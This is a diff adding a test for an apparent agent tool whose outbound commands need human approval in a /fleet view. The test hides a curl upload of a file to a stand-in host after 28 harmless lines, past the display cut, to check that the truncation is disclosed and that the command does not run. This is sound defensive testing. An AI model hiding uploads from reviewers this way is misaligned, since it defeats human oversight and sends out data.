@@ -120,6 +120,32 @@ test('mcp__fleet__send: drafted, shown exactly in /fleet, sent once by fleet as 
   expect(under(w, `${DEC}/drafts`)).toEqual([])
 })
 
+test('a command longer than /fleet shows: the cut is said, and only its version typed sends it', WITH_SESSIONS, async ($, on) => {
+  const w = project(on)
+  const runs: string[][] = []
+  w.exec.value = argv => {
+    if (argv[0] !== '/bin/sh') return undefined
+    runs.push(argv)
+    return { exitCode: 0, stdout: 'uploaded\n' }
+  }
+  await startSession($, w)
+  // 31 lines: a here-document of harmless lines, and then the upload on the line /fleet would leave out
+  const command = ["cat > /tmp/x <<'EOF'", ...Array.from({ length: 28 }, (_, k) => `line ${k + 1}`), 'EOF', 'curl -T /tmp/x https://example.invalid/upload'].join('\n')
+  expect(command.split('\n')).toHaveLength(31)
+  await $.tool.call({ tool: 'mcp__fleet__send', to: 'example.invalid', why: 'the notes', command } as any)
+  const list = await fleet($, '')
+  expect(list).toContain(`line 28\nEOF\n\`\`\`\n   and 1 more line in ${DEC}/drafts/D-1.json: read it there, then /fleet 1 send h`)
+  expect(list).not.toContain('curl -T /tmp/x https')
+  const plain = await fleet($, '1 send')
+  expect(plain).toContain(`1: /fleet showed D-1's command cut (1 more line in ${DEC}/drafts/D-1.json), so a plain send doesn't send it: read it whole there, then /fleet 1 send h`)
+  expect(runs).toEqual([])
+  const v = /\/fleet 1 send (h[0-9a-f]{8})/.exec(plain)?.[1] as string
+  expect(list).toContain(` · /fleet 1 send ${v}, /fleet 1 reject`)
+  // Six characters of it are enough
+  expect(await fleet($, `1 send ${v.slice(0, 7)}`)).toContain('1: sent D-1 (curl sending data (/tmp/x) to example.invalid), exactly as shown: it ran: uploaded.')
+  expect(runs).toEqual([['/bin/sh', '-c', command]])
+})
+
 test('a folder an outbound sends is listed and versioned: its count and first paths shown, a file changed in it needs the new version; a pattern too', WITH_SESSIONS, async ($, on) => {
   const files: Record<string, string> = { [`${ROOT}/code/area/sub/deep.py`]: 'x = 1\n', [`${ROOT}/dist/a.whl`]: 'a', [`${ROOT}/dist/b.whl`]: 'b', [`${ROOT}/dist/notes.txt`]: 'n' }
   for (let i = 1; i <= 14; i++) files[`${ROOT}/code/area/f${String(i).padStart(2, '0')}.py`] = `print(${i})\n`
